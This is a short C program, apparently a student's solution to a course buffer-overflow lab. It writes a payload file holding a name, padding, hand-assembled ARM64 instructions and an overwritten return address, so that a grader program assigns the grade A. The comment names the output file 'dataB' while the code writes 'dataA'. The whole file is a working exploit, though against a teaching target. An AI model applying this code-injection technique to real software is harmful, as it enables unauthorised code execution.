#include <stdio.h>
#include "miniassembler.h"

/* Prints a buffer overun string to the file dataB that causes the
grader to give a grade A to the name Ibraheem Amin */
int main()
{
    FILE *psFile;
    int i;
    psFile = fopen("dataA", "w");
    unsigned long ulACodeAddress = 0x42006c;
    unsigned int curInstruction;

    /* Name */
    fprintf(psFile, "%s", "Ibraheem Amin");
    /* Nullbyte at the end of the name */
    putc(0, psFile);
    /* Nullbytes for padding*/
    for (i = 0; i < 6; i++)
    {
        putc(0, psFile);
    }

    /* mov w0, 'A' */
    curInstruction = MiniAssembler_mov(0, 0x41);
    fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* adr */
    curInstruction = MiniAssembler_adr(1, 0x420044, 0x420070);
    fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* strb */
    curInstruction = MiniAssembler_strb(0, 1);
    fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* */
    curInstruction = MiniAssembler_b(0x40089c, 0x420078);
    fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    for (i = 0; i < 12; i++)
    {
        putc(0, psFile);
    }
    /* address for our grade overwrite code*/
    fwrite(&ulACodeAddress, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}